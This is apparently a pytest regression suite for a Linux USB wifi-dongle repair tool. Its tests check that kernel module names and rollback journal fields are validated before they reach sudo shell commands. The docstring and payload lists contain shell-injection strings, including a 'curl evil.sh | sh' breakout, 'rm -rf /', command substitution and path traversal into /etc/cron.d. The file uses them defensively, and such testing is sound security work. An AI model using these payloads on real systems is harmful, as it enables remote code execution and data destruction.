"""Offensive security audit regressions (ADR 0002 S1/S3/S6).

Each test here reproduces an attack that WORKED against the product. They are
not theoretical exercises: the audit built the payloads, ran them against the
real code and observed the outcome before the fix.

The central finding: `plan_state_b` interpolated the module name straight
into shell strings, without validation, from three untrusted origins (sysfs
via bound_driver/loaded_module and the knowledge-base JSON). A single quote
escaped the quoting and appended an arbitrary command to a line the product
itself tells the user to run with sudo:

    echo '148f 7601' | sudo tee /sys/bus/usb/drivers/mt7601u' ; curl evil.sh | sh ; '/new_id

`require_module_name` already existed and was not called on that path.
"""

from __future__ import annotations

import pytest

from conftest import make_device
from dongle_rescue.repair.planner import plan_state_b
from dongle_rescue.repair.transaction import TransactionRecord, plan_rollback
from dongle_rescue.types import require_module_name

# --------------------------------------------------------------------------
# Payloads that used to survive into the commands built by the planner.
# --------------------------------------------------------------------------
HOSTILE_MODULES = [
    pytest.param("mt7601u' ; curl evil.sh | sh ; '", id="single-quote-escapes-quoting"),
    pytest.param("mt7601u$(id)", id="command-substitution"),
    pytest.param("mt7601u`id`", id="backtick"),
    pytest.param("../../../../etc/cron.d/evil", id="path-traversal"),
    pytest.param("mt7601u\nrm -rf /", id="newline"),
    pytest.param("-rf", id="leading-hyphen-becomes-flag"),
    pytest.param("mt7601u; reboot", id="semicolon"),
    pytest.param("mt7601u|sh", id="pipe"),
]


def _kb(module: str) -> dict:
    return {
        "chipsets": [
            {
                "chipset": "TEST",
                "usb_ids": ["148f:7601"],
                "new_id_feasible": True,
                "new_id_modules": [module],
                "notes": "audit",
            }
        ]
    }


@pytest.mark.parametrize("module", HOSTILE_MODULES)
def test_hostile_kb_does_not_reach_command(module):
    """A module coming from the KB JSON must never reach a command raw."""
    with pytest.raises(ValueError, match="invalid kernel module name"):
        plan_state_b(device=make_device(vid="148f", pid="7601"), kb=_kb(module))


@pytest.mark.parametrize("module", HOSTILE_MODULES)
def test_hostile_sysfs_driver_does_not_reach_command(module):
    """bound_driver comes from sysfs — untrusted input (S6)."""
    with pytest.raises(ValueError, match="invalid kernel module name"):
        plan_state_b(
            device=make_device(vid="148f", pid="7601"),
            kb=_kb("mt7601u"),
            bound_driver=module,
        )


@pytest.mark.parametrize("module", HOSTILE_MODULES)
def test_hostile_loaded_module_does_not_reach_command(module):
    """loaded_module also comes from the host."""
    with pytest.raises(ValueError, match="invalid kernel module name"):
        plan_state_b(
            device=make_device(vid="148f", pid="7601"),
            kb=_kb("mt7601u"),
            loaded_module=module,
        )


def test_legitimate_case_still_works():
    """The fix must not blind the happy path."""
    plan = plan_state_b(device=make_device(vid="148f", pid="7601"), kb=_kb("mt7601u"))

    commands = " ".join(plan.commands)
    assert "/sys/bus/usb/drivers/mt7601u/new_id" in commands
    # no shell metacharacter left where the module name goes
    for forbidden in ("';", "$(", "`", "\n"):
        assert forbidden not in commands


# --------------------------------------------------------------------------
# Module-name grammar: a leading hyphen becomes a FLAG when used as a
# command argument. No real kernel module starts with a hyphen.
# --------------------------------------------------------------------------
@pytest.mark.parametrize("name", ["-rf", "--force", "-", "-x"])
def test_module_must_not_start_with_hyphen(name):
    with pytest.raises(ValueError):
        require_module_name(name)


@pytest.mark.parametrize("name", ["mt7601u", "rtl8xxxu", "ath9k_htc", "rtw_8821cu", "a"])
def test_legitimate_modules_still_valid(name):
    assert require_module_name(name) == name


# --------------------------------------------------------------------------
# Rollback: `remove_file` always validated the path strictly, but
# `remove_new_id` accepted any non-empty string as driver. The journal
# lives on disk and can be tampered with — it is untrusted input (S6).
# --------------------------------------------------------------------------
def _record(action: dict) -> TransactionRecord:
    return TransactionRecord(
        transaction_id="0" * 64,
        before_state={},
        change={},
        after_state={},
        rollback_action=action,
    )


@pytest.mark.parametrize(
    "driver",
    ["x; id", "mt7601u' ; sh ; '", "../../evil", "-rf", "mt7601u`id`"],
)
def test_rollback_rejects_hostile_driver(driver):
    action = {"op": "remove_new_id", "driver": driver, "vid_pid": "148f:7601"}
    with pytest.raises(ValueError):
        plan_rollback(_record(action))


@pytest.mark.parametrize(
    "vid_pid", ["148f", "148f:76011", "zzzz:7601", "148f:7601; id", ""]
)
def test_rollback_rejects_malformed_vid_pid(vid_pid):
    action = {"op": "remove_new_id", "driver": "mt7601u", "vid_pid": vid_pid}
    with pytest.raises(ValueError):
        plan_rollback(_record(action))


def test_legitimate_rollback_still_works():
    action = {"op": "remove_new_id", "driver": "mt7601u", "vid_pid": "148f:7601"}
    steps = plan_rollback(_record(action))

    assert steps[0]["action"] == "remove_new_id"
    assert steps[0]["driver"] == "mt7601u"
    assert steps[0]["if_present"] is True
